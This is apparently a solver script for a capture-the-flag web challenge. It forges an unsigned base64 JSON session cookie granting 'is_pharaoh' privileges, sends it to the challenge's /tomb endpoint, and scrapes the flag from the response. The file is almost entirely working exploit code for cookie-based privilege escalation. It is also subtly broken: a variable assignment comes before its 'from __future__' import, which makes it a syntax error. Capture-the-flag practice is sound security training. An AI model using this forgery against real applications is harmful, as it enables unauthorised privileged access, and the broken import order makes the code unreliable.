#!/usr/bin/env python3
# Forge an unsigned session to become Pharaoh and read the flag from Ramesses.
DESCRIPTION = "Forge an unsigned session to become Pharaoh and read the flag from Ramesses."

from __future__ import annotations

import argparse
import base64
import http.client
import json
import os
import re
import ssl
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional

FLAG_PATTERN = re.compile(r"bctf\{[^}]+\}")


# Build the unsigned session blob that grants is_pharaoh privileges.
def craft_session_cookie(name: str) -> str:
    payload = {"name": name, "is_pharaoh": True}
    encoded = base64.b64encode(json.dumps(payload, separators=(",", ":")).encode())
    return encoded.decode()

# Return an HTTP(S) connection for the requested scheme.
def open_connection(host: str, port: int, scheme: str):
    if scheme == "https":
        return http.client.HTTPSConnection(host, port, context=ssl.create_default_context())
    return http.client.HTTPConnection(host, port)

# Hit /tomb with a forged cookie and extract the flag from the response.
def fetch_flag(host: str, port: int, scheme: str, name: str, verbose: bool) -> str:
    cookie = craft_session_cookie(name)
    if verbose:
        print(f"[verbose] Crafted session cookie for {name!r}: {cookie}")
    conn = open_connection(host, port, scheme)
    headers = {
        "Cookie": f"session={cookie}",
        "User-Agent": "ramesses-solver/1.0",
        "Connection": "close",
    }
    conn.request("GET", "/tomb", headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode(errors="ignore")
    conn.close()
    if verbose:
        print(f"[verbose] Received status {resp.status}, length={len(body)}")
    match = FLAG_PATTERN.search(body)
    if not match:
        raise SystemExit("Unable to find flag in /tomb response")
    return match.group(0)

# Start the local Flask server and return its process handle.
def launch_local_server() -> subprocess.Popen:
    repo_root = Path(__file__).resolve().parent
    cmd = [sys.executable, str(repo_root / "main.py")]
    return subprocess.Popen(
        cmd,
        cwd=str(repo_root),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
    )

# Block until the locally spawned server accepts connections.
def wait_for_server(host: str, port: int, scheme: str, proc: Optional[subprocess.Popen] = None, timeout: float = 5.0) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if proc and proc.poll() is not None:
            raise RuntimeError(f"Local server terminated early (exit code {proc.returncode})")
        try:
            conn = open_connection(host, port, scheme)
            conn.request("HEAD", "/")
            resp = conn.getresponse()
            resp.read()
            conn.close()
            if resp.status < 500:
                return
        except Exception:  # pragma: no cover - retries until server is ready
            pass
        time.sleep(0.1)
    raise RuntimeError("Local server did not start in time")

# Attempt to terminate the locally spawned server.
def shutdown_server(proc: subprocess.Popen) -> None:
    proc.terminate()
    try:
        proc.wait(timeout=2)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=2)


# Coordinate server startup, flag fetching, and output printing.
def main() -> int:
    parser = argparse.ArgumentParser(description=DESCRIPTION)
    parser.add_argument("--host", default="ramesses.challs.pwnoh.io")
    parser.add_argument("--port", type=int)
    parser.add_argument("--name", default="Pharaoh Dave", help="Display name baked into the forged cookie")
    parser.add_argument("--local", action="store_true", help="Run against ramesses/main.py (Flask on port 8000)")
    parser.add_argument("--verbose", action="store_true", help="Log progress")
    args = parser.parse_args()

    scheme = "http" if args.local else "https"
    port = args.port or (8000 if args.local else 443)
    host = "127.0.0.1" if args.local else args.host

    server_proc: Optional[subprocess.Popen] = None
    if args.local:
        server_proc = launch_local_server()
        try:
            wait_for_server(host, port, scheme, server_proc)
        except Exception as exc:
            shutdown_server(server_proc)
            raise SystemExit(f"Local server failed to start: {exc}") from exc

    try:
        flag = fetch_flag(host, port, scheme, args.name, args.verbose)
    finally:
        if server_proc:
            shutdown_server(server_proc)

    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
